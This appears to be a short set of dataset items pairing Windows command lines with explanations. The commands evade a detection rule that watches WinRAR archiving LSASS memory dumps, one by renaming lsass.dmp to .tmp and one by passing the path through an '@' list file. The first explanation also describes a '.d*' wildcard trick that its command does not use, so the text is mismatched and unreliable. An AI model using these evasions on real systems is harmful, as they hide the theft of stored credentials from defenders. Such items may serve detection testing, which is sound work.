output: cmd.exe /c ren C:\temp\lsass.dmp lsass.tmp && winrar.exe a C:\temp\archive.rar C:\temp\lsass.tmp
explanation: By renaming the dump file to a non-monitored extension (.tmp) prior to compression, the command line executed by WinRAR no longer contains the explicit strings '.dmp', '.dump', or '.hdmp', successfully bypassing the 'selection_extension' condition.
Using a wildcard in the file extension (.d*) prevents the command line from containing the exact monitored string (.dmp) while still instructing WinRAR to compress the target dump file.

output: echo C:\temp\lsass.dmp > C:\temp\list.txt && rar.exe a archive.rar @C:\temp\list.txt
explanation: WinRAR supports reading input target files from a list file using the '@' prefix. Passing the target file paths via a text file keeps the '.dmp' string entirely out of the process command line arguments, evading the detection logic.
